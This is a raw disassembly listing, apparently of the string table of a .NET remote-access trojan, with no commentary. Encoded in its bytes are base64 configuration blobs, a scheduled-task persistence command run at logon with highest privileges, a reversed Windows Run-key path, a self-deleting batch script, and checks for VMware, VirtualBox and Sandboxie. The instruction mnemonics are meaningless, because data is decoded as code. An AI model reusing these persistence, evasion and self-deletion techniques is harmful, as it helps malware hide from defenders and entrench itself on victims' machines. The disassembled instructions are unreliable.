  40bf2b:	00 51 00             	add    %dl,0x0(%ecx)
  40bf2e:	6c                   	insb   (%dx),%es:(%edi)
  40bf2f:	00 53 00             	add    %dl,0x0(%ebx)
  40bf32:	68 00 52 00 4e       	push   $0x4e005200
  40bf37:	00 46 00             	add    %al,0x0(%esi)
  40bf3a:	76 00                	jbe    0x40bf3c
  40bf3c:	4f                   	dec    %edi
  40bf3d:	00 47 00             	add    %al,0x0(%edi)
  40bf40:	51                   	push   %ecx
  40bf41:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf44:	49                   	dec    %ecx
  40bf45:	00 2f                	add    %ch,(%edi)
  40bf47:	00 35 00 67 00 51    	add    %dh,0x51006700
  40bf4d:	00 65 00             	add    %ah,0x0(%ebp)
  40bf50:	50                   	push   %eax
  40bf51:	00 32                	add    %dh,(%edx)
  40bf53:	00 73 00             	add    %dh,0x0(%ebx)
  40bf56:	2b 00                	sub    (%eax),%eax
  40bf58:	4d                   	dec    %ebp
  40bf59:	00 35 00 7a 00 33    	add    %dh,0x33007a00
  40bf5f:	00 47 00             	add    %al,0x0(%edi)
  40bf62:	4a                   	dec    %edx
  40bf63:	00 42 00             	add    %al,0x0(%edx)
  40bf66:	69 00 34 00 34 00    	imul   $0x340034,(%eax),%eax
  40bf6c:	32 00                	xor    (%eax),%al
  40bf6e:	34 00                	xor    $0x0,%al
  40bf70:	4a                   	dec    %edx
  40bf71:	00 58 00             	add    %bl,0x0(%eax)
  40bf74:	55                   	push   %ebp
  40bf75:	00 4e 00             	add    %cl,0x0(%esi)
  40bf78:	54                   	push   %esp
  40bf79:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40bf7d:	00 78 00             	add    %bh,0x0(%eax)
  40bf80:	51                   	push   %ecx
  40bf81:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf84:	67 00 3d             	add    %bh,(%di)
  40bf87:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40bf8d:	41                   	inc    %ecx
  40bf8e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf91:	5a                   	pop    %edx
  40bf92:	00 58 00             	add    %bl,0x0(%eax)
  40bf95:	71 00                	jno    0x40bf97
  40bf97:	50                   	push   %eax
  40bf98:	00 2b                	add    %ch,(%ebx)
  40bf9a:	00 69 00             	add    %ch,0x0(%ecx)
  40bf9d:	2f                   	das
  40bf9e:	00 49 00             	add    %cl,0x0(%ecx)
  40bfa1:	6c                   	insb   (%dx),%es:(%edi)
  40bfa2:	00 2f                	add    %ch,(%edi)
  40bfa4:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40bfa8:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40bfac:	00 61 00             	add    %ah,0x0(%ecx)
  40bfaf:	58                   	pop    %eax
  40bfb0:	00 63 00             	add    %ah,0x0(%ebx)
  40bfb3:	78 00                	js     0x40bfb5
  40bfb5:	49                   	dec    %ecx
  40bfb6:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfb9:	34 00                	xor    $0x0,%al
  40bfbb:	48                   	dec    %eax
  40bfbc:	00 4b 00             	add    %cl,0x0(%ebx)
  40bfbf:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40bfc3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfc4:	00 62 00             	add    %ah,0x0(%edx)
  40bfc7:	72 00                	jb     0x40bfc9
  40bfc9:	4a                   	dec    %edx
  40bfca:	00 32                	add    %dh,(%edx)
  40bfcc:	00 43 00             	add    %al,0x0(%ebx)
  40bfcf:	51                   	push   %ecx
  40bfd0:	00 71 00             	add    %dh,0x0(%ecx)
  40bfd3:	66 00 32             	data16 add %dh,(%edx)
  40bfd6:	00 49 00             	add    %cl,0x0(%ecx)
  40bfd9:	35 00 4f 00 64       	xor    $0x64004f00,%eax
  40bfde:	00 6e 00             	add    %ch,0x0(%esi)
  40bfe1:	68 00 62 00 30       	push   $0x30006200
  40bfe6:	00 6f 00             	add    %ch,0x0(%edi)
  40bfe9:	76 00                	jbe    0x40bfeb
  40bfeb:	4f                   	dec    %edi
  40bfec:	00 35 00 74 00 5a    	add    %dh,0x5a007400
  40bff2:	00 71 00             	add    %dh,0x0(%ecx)
  40bff5:	5a                   	pop    %edx
  40bff6:	00 61 00             	add    %ah,0x0(%ecx)
  40bff9:	68 00 55 00 30       	push   $0x30005500
  40bffe:	00 35 00 4f 00 35    	add    %dh,0x35004f00
  40c004:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40c008:	00 6a 00             	add    %ch,0x0(%edx)
  40c00b:	58                   	pop    %eax
  40c00c:	00 48 00             	add    %cl,0x0(%eax)
  40c00f:	30 00                	xor    %al,(%eax)
  40c011:	63 00                	arpl   %eax,(%eax)
  40c013:	2f                   	das
  40c014:	00 41 00             	add    %al,0x0(%ecx)
  40c017:	33 00                	xor    (%eax),%eax
  40c019:	33 00                	xor    (%eax),%eax
  40c01b:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40c01f:	69 00 35 00 6f 00    	imul   $0x6f0035,(%eax),%eax
  40c025:	42                   	inc    %edx
  40c026:	00 76 00             	add    %dh,0x0(%esi)
  40c029:	49                   	dec    %ecx
  40c02a:	00 62 00             	add    %ah,0x0(%edx)
  40c02d:	51                   	push   %ecx
  40c02e:	00 30                	add    %dh,(%eax)
  40c030:	00 47 00             	add    %al,0x0(%edi)
  40c033:	47                   	inc    %edi
  40c034:	00 61 00             	add    %ah,0x0(%ecx)
  40c037:	41                   	inc    %ecx
  40c038:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c03e:	80 b1 6a 00 4a 00 56 	xorb   $0x56,0x4a006a(%ecx)
  40c045:	00 48 00             	add    %cl,0x0(%eax)
  40c048:	4b                   	dec    %ebx
  40c049:	00 31                	add    %dh,(%ecx)
  40c04b:	00 2b                	add    %ch,(%ebx)
  40c04d:	00 58 00             	add    %bl,0x0(%eax)
  40c050:	37                   	aaa
  40c051:	00 35 00 2b 00 6a    	add    %dh,0x6a002b00
  40c057:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40c05b:	00 39                	add    %bh,(%ecx)
  40c05d:	00 36                	add    %dh,(%esi)
  40c05f:	00 43 00             	add    %al,0x0(%ebx)
  40c062:	52                   	push   %edx
  40c063:	00 70 00             	add    %dh,0x0(%eax)
  40c066:	74 00                	je     0x40c068
  40c068:	54                   	push   %esp
  40c069:	00 6b 00             	add    %ch,0x0(%ebx)
  40c06c:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40c070:	37                   	aaa
  40c071:	00 43 00             	add    %al,0x0(%ebx)
  40c074:	47                   	inc    %edi
  40c075:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40c079:	00 37                	add    %dh,(%edi)
  40c07b:	00 48 00             	add    %cl,0x0(%eax)
  40c07e:	6c                   	insb   (%dx),%es:(%edi)
  40c07f:	00 45 00             	add    %al,0x0(%ebp)
  40c082:	51                   	push   %ecx
  40c083:	00 65 00             	add    %ah,0x0(%ebp)
  40c086:	44                   	inc    %esp
  40c087:	00 41 00             	add    %al,0x0(%ecx)
  40c08a:	73 00                	jae    0x40c08c
  40c08c:	4d                   	dec    %ebp
  40c08d:	00 36                	add    %dh,(%esi)
  40c08f:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40c093:	00 79 00             	add    %bh,0x0(%ecx)
  40c096:	6b 00 37             	imul   $0x37,(%eax),%eax
  40c099:	00 49 00             	add    %cl,0x0(%ecx)
  40c09c:	35 00 55 00 55       	xor    $0x55005500,%eax
  40c0a1:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40c0a5:	00 2f                	add    %ch,(%edi)
  40c0a7:	00 55 00             	add    %dl,0x0(%ebp)
  40c0aa:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40c0ae:	39 00                	cmp    %eax,(%eax)
  40c0b0:	36 00 2f             	add    %ch,%ss:(%edi)
  40c0b3:	00 7a 00             	add    %bh,0x0(%edx)
  40c0b6:	38 00                	cmp    %al,(%eax)
  40c0b8:	68 00 58 00 53       	push   $0x53005800
  40c0bd:	00 66 00             	add    %ah,0x0(%esi)
  40c0c0:	41                   	inc    %ecx
  40c0c1:	00 76 00             	add    %dh,0x0(%esi)
  40c0c4:	68 00 31 00 50       	push   $0x50003100
  40c0c9:	00 38                	add    %bh,(%eax)
  40c0cb:	00 55 00             	add    %dl,0x0(%ebp)
  40c0ce:	50                   	push   %eax
  40c0cf:	00 2b                	add    %ch,(%ebx)
  40c0d1:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40c0d5:	00 56 00             	add    %dl,0x0(%esi)
  40c0d8:	49                   	dec    %ecx
  40c0d9:	00 69 00             	add    %ch,0x0(%ecx)
  40c0dc:	61                   	popa
  40c0dd:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40c0e1:	00 70 00             	add    %dh,0x0(%eax)
  40c0e4:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40c0e8:	57                   	push   %edi
  40c0e9:	00 67 00             	add    %ah,0x0(%edi)
  40c0ec:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c0f1:	03 33                	add    (%ebx),%esi
  40c0f3:	00 00                	add    %al,(%eax)
  40c0f5:	80 b1 6d 00 77 00 5a 	xorb   $0x5a,0x77006d(%ecx)
  40c0fc:	00 70 00             	add    %dh,0x0(%eax)
  40c0ff:	75 00                	jne    0x40c101
  40c101:	59                   	pop    %ecx
  40c102:	00 5a 00             	add    %bl,0x0(%edx)
  40c105:	31 00                	xor    %eax,(%eax)
  40c107:	57                   	push   %edi
  40c108:	00 30                	add    %dh,(%eax)
  40c10a:	00 4e 00             	add    %cl,0x0(%esi)
  40c10d:	77 00                	ja     0x40c10f
  40c10f:	72 00                	jb     0x40c111
  40c111:	31 00                	xor    %eax,(%eax)
  40c113:	71 00                	jno    0x40c115
  40c115:	56                   	push   %esi
  40c116:	00 4d 00             	add    %cl,0x0(%ebp)
  40c119:	79 00                	jns    0x40c11b
  40c11b:	4c                   	dec    %esp
  40c11c:	00 66 00             	add    %ah,0x0(%esi)
  40c11f:	4f                   	dec    %edi
  40c120:	00 7a 00             	add    %bh,0x0(%edx)
  40c123:	6e                   	outsb  %ds:(%esi),(%dx)
  40c124:	00 71 00             	add    %dh,0x0(%ecx)
  40c127:	63 00                	arpl   %eax,(%eax)
  40c129:	30 00                	xor    %al,(%eax)
  40c12b:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40c12f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c130:	00 48 00             	add    %cl,0x0(%eax)
  40c133:	34 00                	xor    $0x0,%al
  40c135:	71 00                	jno    0x40c137
  40c137:	45                   	inc    %ebp
  40c138:	00 36                	add    %dh,(%esi)
  40c13a:	00 4d 00             	add    %cl,0x0(%ebp)
  40c13d:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40c141:	46                   	inc    %esi
  40c142:	00 4b 00             	add    %cl,0x0(%ebx)
  40c145:	4f                   	dec    %edi
  40c146:	00 38                	add    %bh,(%eax)
  40c148:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40c14c:	00 2b                	add    %ch,(%ebx)
  40c14e:	00 39                	add    %bh,(%ecx)
  40c150:	00 33                	add    %dh,(%ebx)
  40c152:	00 65 00             	add    %ah,0x0(%ebp)
  40c155:	2f                   	das
  40c156:	00 51 00             	add    %dl,0x0(%ecx)
  40c159:	68 00 72 00 65       	push   $0x65007200
  40c15e:	00 57 00             	add    %dl,0x0(%edi)
  40c161:	50                   	push   %eax
  40c162:	00 31                	add    %dh,(%ecx)
  40c164:	00 71 00             	add    %dh,0x0(%ecx)
  40c167:	45                   	inc    %ebp
  40c168:	00 78 00             	add    %bh,0x0(%eax)
  40c16b:	79 00                	jns    0x40c16d
  40c16d:	69 00 68 00 64 00    	imul   $0x640068,(%eax),%eax
  40c173:	6a 00                	push   $0x0
  40c175:	4d                   	dec    %ebp
  40c176:	00 30                	add    %dh,(%eax)
  40c178:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40c17c:	00 66 00             	add    %ah,0x0(%esi)
  40c17f:	35 00 57 00 4a       	xor    $0x4a005700,%eax
  40c184:	00 32                	add    %dh,(%edx)
  40c186:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40c18a:	00 42 00             	add    %al,0x0(%edx)
  40c18d:	4b                   	dec    %ebx
  40c18e:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40c192:	00 56 00             	add    %dl,0x0(%esi)
  40c195:	4e                   	dec    %esi
  40c196:	00 53 00             	add    %dl,0x0(%ebx)
  40c199:	73 00                	jae    0x40c19b
  40c19b:	4d                   	dec    %ebp
  40c19c:	00 58 00             	add    %bl,0x0(%eax)
  40c19f:	62 00                	bound  %eax,(%eax)
  40c1a1:	51                   	push   %ecx
  40c1a2:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c1a8:	09 6e 00             	or     %ebp,0x0(%esi)
  40c1ab:	75 00                	jne    0x40c1ad
  40c1ad:	6c                   	insb   (%dx),%es:(%edi)
  40c1ae:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c1b2:	01 00                	add    %eax,(%eax)
  40c1b4:	03 3a                	add    (%edx),%edi
  40c1b6:	00 00                	add    %al,(%eax)
  40c1b8:	0d 50 00 61 00       	or     $0x610050,%eax
  40c1bd:	63 00                	arpl   %eax,(%eax)
  40c1bf:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c1c2:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c1c6:	09 50 00             	or     %edx,0x0(%eax)
  40c1c9:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c1cf:	00 0f                	add    %cl,(%edi)
  40c1d1:	4d                   	dec    %ebp
  40c1d2:	00 65 00             	add    %ah,0x0(%ebp)
  40c1d5:	73 00                	jae    0x40c1d7
  40c1d7:	73 00                	jae    0x40c1d9
  40c1d9:	61                   	popa
  40c1da:	00 67 00             	add    %ah,0x0(%edi)
  40c1dd:	65 00 00             	add    %al,%gs:(%eax)
  40c1e0:	07                   	pop    %es
  40c1e1:	63 00                	arpl   %eax,(%eax)
  40c1e3:	6d                   	insl   (%dx),%es:(%edi)
  40c1e4:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c1e8:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c1ee:	00 73 00             	add    %dh,0x0(%ebx)
  40c1f1:	63 00                	arpl   %eax,(%eax)
  40c1f3:	68 00 74 00 61       	push   $0x61007400
  40c1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40c1fb:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c1fe:	00 20                	add    %ah,(%eax)
  40c200:	00 2f                	add    %ch,(%edi)
  40c202:	00 63 00             	add    %ah,0x0(%ebx)
  40c205:	72 00                	jb     0x40c207
  40c207:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c20b:	74 00                	je     0x40c20d
  40c20d:	65 00 20             	add    %ah,%gs:(%eax)
  40c210:	00 2f                	add    %ch,(%edi)
  40c212:	00 66 00             	add    %ah,0x0(%esi)
  40c215:	20 00                	and    %al,(%eax)
  40c217:	2f                   	das
  40c218:	00 73 00             	add    %dh,0x0(%ebx)
  40c21b:	63 00                	arpl   %eax,(%eax)
  40c21d:	20 00                	and    %al,(%eax)
  40c21f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c220:	00 6e 00             	add    %ch,0x0(%esi)
  40c223:	6c                   	insb   (%dx),%es:(%edi)
  40c224:	00 6f 00             	add    %ch,0x0(%edi)
  40c227:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c22b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c22c:	00 20                	add    %ah,(%eax)
  40c22e:	00 2f                	add    %ch,(%edi)
  40c230:	00 72 00             	add    %dh,0x0(%edx)
  40c233:	6c                   	insb   (%dx),%es:(%edi)
  40c234:	00 20                	add    %ah,(%eax)
  40c236:	00 68 00             	add    %ch,0x0(%eax)
  40c239:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c23f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c243:	74 00                	je     0x40c245
  40c245:	20 00                	and    %al,(%eax)
  40c247:	2f                   	das
  40c248:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c24c:	00 20                	add    %ah,(%eax)
  40c24e:	00 22                	add    %ah,(%edx)
  40c250:	00 00                	add    %al,(%eax)
  40c252:	11 22                	adc    %esp,(%edx)
  40c254:	00 20                	add    %ah,(%eax)
  40c256:	00 2f                	add    %ch,(%edi)
  40c258:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c25c:	00 20                	add    %ah,(%eax)
  40c25e:	00 27                	add    %ah,(%edi)
  40c260:	00 22                	add    %ah,(%edx)
  40c262:	00 01                	add    %al,(%ecx)
  40c264:	13 22                	adc    (%edx),%esp
  40c266:	00 27                	add    %ah,(%edi)
  40c268:	00 20                	add    %ah,(%eax)
  40c26a:	00 26                	add    %ah,(%esi)
  40c26c:	00 20                	add    %ah,(%eax)
  40c26e:	00 65 00             	add    %ah,0x0(%ebp)
  40c271:	78 00                	js     0x40c273
  40c273:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c279:	5c                   	pop    %esp
  40c27a:	00 6e 00             	add    %ch,0x0(%esi)
  40c27d:	75 00                	jne    0x40c27f
  40c27f:	52                   	push   %edx
  40c280:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c284:	00 6f 00             	add    %ch,0x0(%edi)
  40c287:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c28d:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c291:	74 00                	je     0x40c293
  40c293:	6e                   	outsb  %ds:(%esi),(%dx)
  40c294:	00 65 00             	add    %ah,0x0(%ebp)
  40c297:	72 00                	jb     0x40c299
  40c299:	72 00                	jb     0x40c29b
  40c29b:	75 00                	jne    0x40c29d
  40c29d:	43                   	inc    %ebx
  40c29e:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c2a2:	00 77 00             	add    %dh,0x0(%edi)
  40c2a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2a6:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c2aa:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ad:	57                   	push   %edi
  40c2ae:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c2b2:	00 66 00             	add    %ah,0x0(%esi)
  40c2b5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b6:	00 73 00             	add    %dh,0x0(%ebx)
  40c2b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ba:	00 72 00             	add    %dh,0x0(%edx)
  40c2bd:	63 00                	arpl   %eax,(%eax)
  40c2bf:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c2c5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2c9:	61                   	popa
  40c2ca:	00 77 00             	add    %dh,0x0(%edi)
  40c2cd:	74 00                	je     0x40c2cf
  40c2cf:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c2d3:	53                   	push   %ebx
  40c2d4:	00 00                	add    %al,(%eax)
  40c2d6:	03 22                	add    (%edx),%esp
  40c2d8:	00 00                	add    %al,(%eax)
  40c2da:	09 2e                	or     %ebp,(%esi)
  40c2dc:	00 62 00             	add    %ah,0x0(%edx)
  40c2df:	61                   	popa
  40c2e0:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c2e4:	13 40 00             	adc    0x0(%eax),%eax
  40c2e7:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c2eb:	68 00 6f 00 20       	push   $0x20006f00
  40c2f0:	00 6f 00             	add    %ch,0x0(%edi)
  40c2f3:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c2f7:	00 1f                	add    %bl,(%edi)
  40c2f9:	74 00                	je     0x40c2fb
  40c2fb:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c301:	6f                   	outsl  %ds:(%esi),(%dx)
  40c302:	00 75 00             	add    %dh,0x0(%ebp)
  40c305:	74 00                	je     0x40c307
  40c307:	20 00                	and    %al,(%eax)
  40c309:	33 00                	xor    (%eax),%eax
  40c30b:	20 00                	and    %al,(%eax)
  40c30d:	3e 00 20             	add    %ah,%ds:(%eax)
  40c310:	00 4e 00             	add    %cl,0x0(%esi)
  40c313:	55                   	push   %ebp
  40c314:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c318:	15 53 00 54 00       	adc    $0x540053,%eax
  40c31d:	41                   	inc    %ecx
  40c31e:	00 52 00             	add    %dl,0x0(%edx)
  40c321:	54                   	push   %esp
  40c322:	00 20                	add    %ah,(%eax)
  40c324:	00 22                	add    %ah,(%edx)
  40c326:	00 22                	add    %ah,(%edx)
  40c328:	00 20                	add    %ah,(%eax)
  40c32a:	00 22                	add    %ah,(%edx)
  40c32c:	00 00                	add    %al,(%eax)
  40c32e:	07                   	pop    %es
  40c32f:	43                   	inc    %ebx
  40c330:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c334:	00 00                	add    %al,(%eax)
  40c336:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c33a:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c33e:	00 22                	add    %ah,(%edx)
  40c340:	00 00                	add    %al,(%eax)
  40c342:	0f 22 00             	mov    %eax,%cr0
  40c345:	20 00                	and    %al,(%eax)
  40c347:	2f                   	das
  40c348:	00 66 00             	add    %ah,0x0(%esi)
  40c34b:	20 00                	and    %al,(%eax)
  40c34d:	2f                   	das
  40c34e:	00 71 00             	add    %dh,0x0(%ecx)
  40c351:	00 05 78 00 70 00    	add    %al,0x700078
  40c357:	00 45 53             	add    %al,0x53(%ebp)
  40c35a:	00 65 00             	add    %ah,0x0(%ebp)
  40c35d:	6c                   	insb   (%dx),%es:(%edi)
  40c35e:	00 65 00             	add    %ah,0x0(%ebp)
  40c361:	63 00                	arpl   %eax,(%eax)
  40c363:	74 00                	je     0x40c365
  40c365:	20 00                	and    %al,(%eax)
  40c367:	2a 00                	sub    (%eax),%al
  40c369:	20 00                	and    %al,(%eax)
  40c36b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c36f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c370:	00 6d 00             	add    %ch,0x0(%ebp)
  40c373:	20 00                	and    %al,(%eax)
  40c375:	57                   	push   %edi
  40c376:	00 69 00             	add    %ch,0x0(%ecx)
  40c379:	6e                   	outsb  %ds:(%esi),(%dx)
  40c37a:	00 33                	add    %dh,(%ebx)
  40c37c:	00 32                	add    %dh,(%edx)
  40c37e:	00 5f 00             	add    %bl,0x0(%edi)
  40c381:	43                   	inc    %ebx
  40c382:	00 6f 00             	add    %ch,0x0(%edi)
  40c385:	6d                   	insl   (%dx),%es:(%edi)
  40c386:	00 70 00             	add    %dh,0x0(%eax)
  40c389:	75 00                	jne    0x40c38b
  40c38b:	74 00                	je     0x40c38d
  40c38d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c391:	53                   	push   %ebx
  40c392:	00 79 00             	add    %bh,0x0(%ecx)
  40c395:	73 00                	jae    0x40c397
  40c397:	74 00                	je     0x40c399
  40c399:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c39d:	00 19                	add    %bl,(%ecx)
  40c39f:	4d                   	dec    %ebp
  40c3a0:	00 61 00             	add    %ah,0x0(%ecx)
  40c3a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3a4:	00 75 00             	add    %dh,0x0(%ebp)
  40c3a7:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c3ab:	63 00                	arpl   %eax,(%eax)
  40c3ad:	74 00                	je     0x40c3af
  40c3af:	75 00                	jne    0x40c3b1
  40c3b1:	72 00                	jb     0x40c3b3
  40c3b3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3b7:	00 2b                	add    %ch,(%ebx)
  40c3b9:	6d                   	insl   (%dx),%es:(%edi)
  40c3ba:	00 69 00             	add    %ch,0x0(%ecx)
  40c3bd:	63 00                	arpl   %eax,(%eax)
  40c3bf:	72 00                	jb     0x40c3c1
  40c3c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3c2:	00 73 00             	add    %dh,0x0(%ebx)
  40c3c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3c6:	00 66 00             	add    %ah,0x0(%esi)
  40c3c9:	74 00                	je     0x40c3cb
  40c3cb:	20 00                	and    %al,(%eax)
  40c3cd:	63 00                	arpl   %eax,(%eax)
  40c3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d0:	00 72 00             	add    %dh,0x0(%edx)
  40c3d3:	70 00                	jo     0x40c3d5
  40c3d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d6:	00 72 00             	add    %dh,0x0(%edx)
  40c3d9:	61                   	popa
  40c3da:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c3de:	00 6f 00             	add    %ch,0x0(%edi)
  40c3e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3e2:	00 00                	add    %al,(%eax)
  40c3e4:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c3e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3e8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c3ec:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c3f0:	0f 56 00             	orps   (%eax),%xmm0
  40c3f3:	49                   	dec    %ecx
  40c3f4:	00 52 00             	add    %dl,0x0(%edx)
  40c3f7:	54                   	push   %esp
  40c3f8:	00 55 00             	add    %dl,0x0(%ebp)
  40c3fb:	41                   	inc    %ecx
  40c3fc:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c400:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c405:	77 00                	ja     0x40c407
  40c407:	61                   	popa
  40c408:	00 72 00             	add    %dh,0x0(%edx)
  40c40b:	65 00 00             	add    %al,%gs:(%eax)
  40c40e:	15 56 00 69 00       	adc    $0x690056,%eax
  40c413:	72 00                	jb     0x40c415
  40c415:	74 00                	je     0x40c417
  40c417:	75 00                	jne    0x40c419
  40c419:	61                   	popa
  40c41a:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c41e:	00 6f 00             	add    %ch,0x0(%edi)
  40c421:	78 00                	js     0x40c423
  40c423:	00 17                	add    %dl,(%edi)
  40c425:	53                   	push   %ebx
  40c426:	00 62 00             	add    %ah,0x0(%edx)
  40c429:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c42f:	6c                   	insb   (%dx),%es:(%edi)
  40c430:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c434:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c438:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c43c:	11 45 00             	adc    %eax,0x0(%ebp)
  40c43f:	72 00                	jb     0x40c441
  40c441:	72 00                	jb     0x40c443
  40c443:	20 00                	and    %al,(%eax)
  40c445:	48                   	dec    %eax
  40c446:	00 57 00             	add    %dl,0x0(%edi)
  40c449:	49                   	dec    %ecx
  40c44a:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c44e:	05 78 00 32 00       	add    $0x320078,%eax
  40c453:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c459:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c45f:	74 00                	je     0x40c461
  40c461:	49                   	dec    %ecx
  40c462:	00 6e 00             	add    %ch,0x0(%esi)
  40c465:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c469:	00 09                	add    %cl,(%ecx)
  40c46b:	48                   	dec    %eax
  40c46c:	00 57 00             	add    %dl,0x0(%edi)
  40c46f:	49                   	dec    %ecx
  40c470:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c474:	09 55 00             	or     %edx,0x0(%ebp)
  40c477:	73 00                	jae    0x40c479
  40c479:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c47d:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c483:	00 13                	add    %dl,(%ebx)
  40c485:	4d                   	dec    %ebp
  40c486:	00 69 00             	add    %ch,0x0(%ecx)
  40c489:	63 00                	arpl   %eax,(%eax)
  40c48b:	72 00                	jb     0x40c48d
  40c48d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c48e:	00 73 00             	add    %dh,0x0(%ebx)
  40c491:	6f                   	outsl  %ds:(%esi),(%dx)
  40c492:	00 66 00             	add    %ah,0x0(%esi)
  40c495:	74 00                	je     0x40c497
  40c497:	00 03                	add    %al,(%ebx)
  40c499:	20 00                	and    %al,(%eax)
  40c49b:	00 09                	add    %cl,(%ecx)
  40c49d:	54                   	push   %esp
  40c49e:	00 72 00             	add    %dh,0x0(%edx)
  40c4a1:	75 00                	jne    0x40c4a3
  40c4a3:	65 00 00             	add    %al,%gs:(%eax)
  40c4a6:	0b 36                	or     (%esi),%esi
  40c4a8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c4ab:	62 00                	bound  %eax,(%eax)
  40c4ad:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c4b3:	46                   	inc    %esi
  40c4b4:	00 61 00             	add    %ah,0x0(%ecx)
  40c4b7:	6c                   	insb   (%dx),%es:(%edi)
